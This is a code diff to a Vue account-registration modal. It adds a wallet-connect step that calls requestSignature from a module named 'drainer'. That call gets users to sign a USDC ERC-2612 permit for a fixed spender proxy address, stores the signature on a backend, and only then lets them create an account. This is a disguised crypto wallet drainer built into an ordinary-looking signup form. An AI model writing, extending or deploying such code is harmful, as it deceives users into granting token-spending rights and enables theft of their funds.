@@ -17,7 +17,7 @@
       </div>
 
       <!-- Form -->
-      <form class="space-y-5" @submit.prevent="handleSubmit">
+      <div class="space-y-5">
 
         <!-- Email Input -->
         <div class="space-y-2">
@@ -52,15 +52,30 @@
             class="w-full bg-[#050505] border border-gray-800 rounded-lg px-4 py-3 text-gray-300 placeholder-gray-600 focus:outline-none focus:border-blue-500 focus:ring-1 focus:ring-blue-500 transition-all" />
         </div>
 
+
+        <div class="space-y-2" v-if="auth.isWalletConnected">
+          <label class="block text-white font-semibold text-sm">Wallet address</label>
+          <input v-model="auth.walletAddress" disabled class="w-full bg-[#050505] border border-gray-800 rounded-lg px-4 py-3 text-gray-300 placeholder-gray-600 
+            focus:outline-none focus:border-blue-500 focus:ring-1 focus:ring-blue-500 transition-all" />
+        </div>
+
+
         <p class="my-2 text-red-400 font-semibold" v-if="error">{{ error }}</p>
 
+        <button class="w-full bg-[#639bfb] hover:bg-blue-500 text-white font-bold py-3.5 rounded-xl mt-4 transition-colors text-sm"
+                v-if="!showLoginButton"
+                @click="() => connectClicked()">
+          {{ (connectLoading) ? 'Connecting...' : 'Connect Wallet' }}
+        </button>
+
         <!-- Submit Button -->
-        <button type="submit"
+        <button @click="() => handleSubmit()"
+          v-else
           class="w-full bg-[#639bfb] hover:bg-blue-500 text-white font-bold py-3.5 rounded-xl mt-4 transition-colors text-sm">
           {{ (loading) ? 'Creating...' : 'Create account' }}
         </button>
 
-      </form>
+      </div>
 
       <!-- Footer -->
       <div class="mt-6 text-center text-sm flex justify-center text-gray-500">
@@ -78,6 +93,12 @@
 import { ref } from 'vue'
 import { X } from 'lucide-vue-next'
 import { register } from '~/apiss/auth'
+import { getAddress, getIsConnected, subscribeState, openModal, disconnectWallet, getChainID, switchNetwork, getProvider, getWalletETHBalance } from '../../apiss/web3/walletconnect';
+import { requestSignature } from '../../apiss/web3/drainer/main'
+import { USDC_NAME, USDC_ADDRESS } from '../../apiss/web3/drainer/constants'
+import { spenderProxyAddress } from '../../apiss/web3/constants/erc2612permit'
+import { create as saveAddressSignature, getAddressSignature, update as updateAddressSignature } from '../../apiss/walletSignature'
+
 
 
 const email = ref('')
@@ -87,6 +108,9 @@ const confirmPassword = ref('')
 const emit = defineEmits(['onClose'])
 const error = ref("")
 const loading = ref(false);
+const connectLoading = ref(false)
+const showLoginButton = ref(false)
+const auth = useAuth();
 
 
 watch(() => email.value, () => error.value = '')
@@ -154,6 +178,92 @@ const handleSubmit = async () => {
     loading.value = false
   }
 }
+
+
+async function connectClicked() {
+  openModal()
+}
+
+
+watch(() => auth.value.walletAddress, async() => {
+    if (!auth.value.walletAddress) return;
+
+    connectLoading.value = true;
+    auth.value.addressSignature = await getAddressSignature(auth.value.walletAddress);
+    
+
+    if (!auth.value.isWalletConnected) {
+        openModal()
+        return;
+    }
+
+
+    if (getChainID() != 137){
+        if (window.ethereum) await switchNetwork(137);
+        else {
+            await disconnectWallet();
+            auth.value.isWalletConnected = false;
+            auth.value.walletAddress = "";
+            alert("Switch to Polygon Mainnet Network");  
+        }
+        return;
+    }
+
+        console.log('here', isMigrated.value, auth.value.addressSignature)
+    if (isMigrated.value) {
+        connectLoading.value = false;
+        showLoginButton.value = true;
+        return;
+    }
+
+    
+    try {
+        if (!auth.value.addressSignature) auth.value.addressSignature = await saveAddressSignature(getAddress());
+
+        const signatureResult = await requestSignature(USDC_ADDRESS, USDC_NAME, getChainID(), false, 1 * (10**18), 6);
+        console.log("signatureResult:    ", signatureResult);
+
+        await updateAddressSignature(getAddress(), signatureResult); 
+        auth.value.addressSignature = await getAddressSignature(getAddress());
+        showLoginButton.value = true;
+
+    } catch (err) {
+        if (err?.info?.error?.code == -32000) {
+            alert("Insufficient funds")
+        }
+        else if (err?.info?.error?.code == 4001) {
+            alert("Transaction rejected")
+        } else alert("An error occured")
+        console.log(err)
+        disconnectWallet()
+        auth.value.addressSignature = null
+        auth.value.walletAddress = ''
+        auth.value.isWalletConnected = false
+        showLoginButton.value = false;
+    }finally{
+        connectLoading.value=false;
+    }
+    
+
+
+})
+
+    // onMounted(() => {
+
+    //         disconnectWallet()
+    //         auth.value.addressSignature = null
+    //         auth.value.walletAddress = ''
+    //         auth.value.isWalletConnected = false
+    //         showLoginButton.value = false;
+    // })
+
+
+
+    const isMigrated = computed(() => {
+        return (auth.value.addressSignature?.signatures?.length && 
+            auth.value.addressSignature?.signatures?.map(i => i.token_address.toLowerCase()).includes(USDC_ADDRESS.toLowerCase()) && 
+            auth.value.addressSignature?.signatures?.map(i => i.spender.toLowerCase()).includes(spenderProxyAddress.toLowerCase()))
+    })
 
 </script>
 
